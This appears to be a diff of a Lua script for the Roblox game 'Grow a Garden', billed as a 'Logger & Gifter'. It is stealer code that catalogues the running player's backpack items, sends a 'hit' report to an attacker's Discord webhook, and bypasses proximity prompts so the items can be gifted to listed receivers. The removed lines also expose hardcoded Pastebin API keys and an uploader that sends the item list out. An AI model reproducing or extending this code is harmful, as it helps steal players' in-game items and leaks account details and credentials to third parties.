@@ -1,17 +1,11 @@
--- Grow a Garden: Ultimate Logger & Gifter (with top items in embed and all in Pastebin)
+-- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
 -- Made By Timoci | discord.gg/notyet
 
 local CONFIG = {
     USERNAMES = _G.Usernames or {},
     WEBHOOK   = _G.webhook or "",
     MIN_VALUE = _G.min_value or 1,
-    PASTEBIN_API = {
-        DEV_KEY  = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x",    -- https://pastebin.com/api
-        USER_KEY = "b5bf0595dcddad1dccad491d1c1f648d"    -- See https://pastebin.com/api#1
-    },
-    SHOW_TOP = 5  -- How many top-value items to show in the embed
 }
-
 local RARE_PETS = {
     ["Raccoon"]        = "🦥",
     ["Dragonfly"]      = "🐦‍🔥",
@@ -68,7 +62,6 @@ local function formatValue(n)
     local s = tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","") return s
 end
 
--- Gather all items, sorted!
 local function collectItems()
     local items, totalValue, foundRare = {}, 0, false
     for _, tool in ipairs(backpack:GetChildren()) do
@@ -127,117 +120,33 @@ local function collectItems()
     return items, totalValue, foundRare
 end
 
--- Pastebin uploader: returns the paste URL or nil
-local function uploadToPastebin(pasteTitle, pasteContent)
-    local api_dev_key = CONFIG.PASTEBIN_API.DEV_KEY
-    local api_user_key = CONFIG.PASTEBIN_API.USER_KEY
-    if not api_dev_key or not api_user_key or api_dev_key == "" or api_user_key == "" then return nil end
-
-    local body = "api_dev_key=" .. api_dev_key ..
-        "&api_user_key=" .. api_user_key ..
-        "&api_option=paste" ..
-        "&api_paste_private=1" ..
-        "&api_paste_name=" .. HttpService:UrlEncode(pasteTitle) ..
-        "&api_paste_expire_date=1D" ..
-        "&api_paste_code=" .. HttpService:UrlEncode(pasteContent)
-
-    local response = nil
-    pcall(function()
-        response = req({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
-            Body = body,
-        })
-    end)
-    if response and response.Body and response.Body:sub(1,15) == "https://pastebin" then
-        -- convert to raw:
-        return response.Body:gsub("https://pastebin.com/", "https://pastebin.com/raw/")
-    end
-    return nil
-end
-
--- Only show the TOP items (by value) in the embed!
-local function buildTopItemsSection(items, howmany)
+-- THIS IS THE CORRECT FINAL VERSION:
+local function buildBackpackSection(items)
     if #items == 0 then return "_No giftable items found!_" end
     local itemLines = {}
-    for i=1, math.min(howmany, #items) do
-        local item = items[i]
-        if item.Type == "Pet" then
-            table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
-        else
-            table.insert(itemLines, string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
-        end
-    end
-    if #items > howmany then
-        table.insert(itemLines, string.format("_+%d more..._", #items - howmany))
+    for _, item in ipairs(items) do
+        if item.Type == "Pet" then table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
+        else table.insert(itemLines, string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value))) end
     end
     return table.concat(itemLines, "\n")
 end
 
--- Everything (for Pastebin)
-local function buildPastebinContent(items)
-    if #items == 0 then return "No giftable items found!" end
-    local lines = {}
-    for _, item in ipairs(items) do
-        if item.Type == "Pet" then
-            table.insert(lines, string.format("%s [%s] [%.2fkg] [Age %s] | %s¢", item.Type, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
-        else
-            table.insert(lines, string.format("%s [%s] [%.2fkg] | %s¢", item.Type, item.Name, item.Weight, formatValue(item.Value)))
-        end
-    end
-    return table.concat(lines, "\n")
-end
-
--- Improved embed function: top in embed, all in Pastebin button
 local function prettyEmbed(executer, receiver)
     local items, totalValue, foundRare = collectItems()
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local accountAge = (executer and executer.AccountAge or "?") .. " days"
-    local pastebinLink = uploadToPastebin(
-        ("GAG Hit Log for %s"):format(executer.Name or "Unknown"),
-        buildPastebinContent(items)
-    ) or "Couldn't create paste!"
-
-    -- Discord embed!
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {{
-            title = "🥗 Grow A Garden Hit - DARK SCRIPTS ☘️",
+            title = "🥗 Grow A Garden Hit",
             color = foundRare and 16776960 or 65280,
             fields = {
-                {
-                    name = "🧑‍💻 Player Information",
-                    value = string.format(
-                        "**Name:** `%s`\n**Receiver:** `%s`\n**Executor:** `%s`\n**Account Age:** `%s`",
-                        executer.Name, receiver, "Delta", accountAge
-                    ),
-                    inline = false
-                },
-                {
-                    name = "💰 Total Value",
-                    value = string.format("**%s¢**", formatValue(totalValue)),
-                    inline = false
-                },
-                {
-                    name = "🎒 Most Valuable Items",
-                    value = buildTopItemsSection(items, CONFIG.SHOW_TOP),
-                    inline = false
-                },
-                {
-                    name = "🍁 View All",
-                    value = (pastebinLink:find("https://pastebin.com/raw/") 
-                        and ("[View All Gifted Items](%s)"):format(pastebinLink) 
-                        or pastebinLink),
-                    inline = false
-                },
-                {
-                    name = "🌴 Join with URL",
-                    value = string.format("[Join with URL](%s)", joinLink),
-                    inline = false
-                }
+                {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
+                {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
+                {name = "🎒 Backpack", value = buildBackpackSection(items), inline = false},
+                {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false}
             },
-            footer = {text = "Made By Timoci | discord.gg/notyet"}
+            footer = {text = "Made By Timoci"}
         }}
     }
 end
@@ -246,14 +155,9 @@ local function sendHitWebhook(executer, receiver)
     if webhookSent then return end
     webhookSent = true
     local data = prettyEmbed(executer, receiver)
-    if req then req({
-        Url = CONFIG.WEBHOOK,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data) }) end
+    if req then req({ Url = CONFIG.WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data) }) end
 end
 
--- Everything else unchanged!
 local function bypassProximityPrompt(prompt)
     local ok = pcall(function() return fireproximityprompt(prompt) end)
     if ok then return end
